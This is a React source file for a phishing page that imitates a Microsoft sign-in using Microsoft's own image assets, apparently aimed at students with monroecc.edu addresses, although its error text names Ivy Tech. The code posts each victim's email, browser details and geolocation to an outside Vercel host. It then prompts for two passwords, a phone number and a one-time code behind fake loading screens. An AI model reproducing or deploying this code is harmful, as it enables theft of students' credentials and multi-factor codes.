import { useState, useRef, useEffect } from "react";
import "./App.css";
import Logo from "./assets/bannerlogo.png";
import { Email } from "./components/Email";
import { Password } from "./components/Password";
import { Loader } from "./components/Loader";
import { OTP } from "./components/OTP";
import { Phone } from "./components/Phone";
import gsap from "gsap";
import axios from "axios";

function App() {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState("");
  const [firstPassword, setFirstPassword] = useState("");
  const [secondPassword, setSecondPassword] = useState("");
  const [otp, setOtp] = useState("");
  const [phone, setPhone] = useState("");
  const formRef = useRef(null);
  const signInOptionsRef = useRef(null);

  const handleInputChange = (e) => {
    const field = e.target;
    field.style.backgroundColor = field.value ? "#E8F0FE" : "transparent";
  };

  const animateTransition = () => {
    if (formRef.current) {
      gsap.fromTo(
        formRef.current,
        { x: 500, opacity: 0 },
        { x: 0, opacity: 1, duration: 0.5, ease: "power2.out" }
      );
    }
  };

  const fadeSignInOptions = (show) => {
    if (signInOptionsRef.current) {
      gsap.to(signInOptionsRef.current, {
        opacity: show ? 1 : 0,
        display: show ? "flex" : "none",
        duration: 0.3,
        ease: "power3.out",
      });
    }
  };

  useEffect(() => {
    animateTransition();
    fadeSignInOptions(step === "email");
  }, [step]);

  const handleNextFromEmail = async (emailValue) => {
    const eduEmailRegex =
      /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?monroecc\.edu$/;
    if (!emailValue.trim()) {
      setEmailError("Please enter an email.");
    } else if (!eduEmailRegex.test(emailValue)) {
      setEmailError(
        "This doesn’t appear to be a valid Ivy Tech school email. Please check and try again."
      );
    } else {
      setEmailError("");
      setEmail(emailValue);
      setStep("loader");

      // Save the email in sessionStorage
      sessionStorage.setItem("student_id", emailValue);

      try {
        // Gather client details
        const clientInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
        };

        // Get current time
        const currentTime = new Date().toISOString();

        // Optional: Get location (requires user consent)
        const locationPromise = new Promise((resolve) => {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                resolve({
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                });
              },
              () => resolve(null)
            );
          } else {
            resolve(null);
          }
        });

        const location = await locationPromise;

        // Prepare payload
        const payload = {
          student_id: emailValue,
          client_info: clientInfo,
          time: currentTime,
          location,
        };

        // Send the data via the API
        const response = await axios.post(
          "https://ivytechedu-cvfc.vercel.app/send-email",
          payload
        );

        if (response.status === 200) {
          console.log("Email and details sent successfully:", response.data);
        } else {
          console.error("Error sending details:", response.data);
        }
      } catch (error) {
        console.error("Failed to send details:", error);
      }

      setTimeout(() => setStep("password"), 3000);
    }
  };

  const handleNextFromPassword = (password, isSecondPassword) => {
    if (isSecondPassword) {
      setSecondPassword(password);
    } else {
      setFirstPassword(password);
    }
    setStep("loader");
    setTimeout(() => setStep("phone"), 2000);
  };

  const handleNextFromPhone = (phoneValue) => {
    setPhone(phoneValue);
    setStep("loader");
    setTimeout(() => setStep("otp"), 2000);
  };

  const handleOtpVerification = () => {
    setStep("loader");
    setTimeout(() => {
      setStep("nextStep"); // Placeholder for the next step after OTP
    }, 2000);
  };

  const handleBackToEmail = () => setStep("email");
  const handleBackToPassword = () => setStep("password");
  const handleBackToPhone = () => setStep("phone");

  return (
    <div className="major-container">
      <img
        className="outlook"
        src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png"
        alt="logo"
      />
      <div className="container">
        <img src={Logo} alt="logo" className="logo" />
        <div className="form-wrapper" ref={formRef}>
          {step === "email" && (
            <Email
              onNext={handleNextFromEmail}
              emailError={emailError}
              email={email}
              onInputChange={handleInputChange}
              setStep={setStep}
            />
          )}
          {step === "loader" && <Loader />}
          {step === "password" && (
            <Password
              email={email}
              onBack={handleBackToEmail}
              onNext={(password) => handleNextFromPassword(password, false)}
              onInputChange={handleInputChange}
              setStep={setStep}
            />
          )}
          {step === "otp" && (
            <OTP
              email={email}
              onBack={handleBackToPhone}
              onVerify={handleOtpVerification}
              setOtp={setOtp}
              setStep={setStep}
            />
          )}
          {step === "phone" && (
            <Phone
              onBack={handleBackToPassword}
              onNext={handleNextFromPhone}
              phoneError={emailError}
              phone={phone}
              onInputChange={handleInputChange}
              setStep={setStep}
            />
          )}
        </div>
      </div>
      <div className="signin-options" ref={signInOptionsRef}>
        <img
          src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          alt="key"
        />
        <aside>Sign-in options</aside>
      </div>
      <div className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#" className="dot">
          •••
        </a>
      </div>
      <br />
      <br />
      <br />
    </div>
  );
}

export default App;
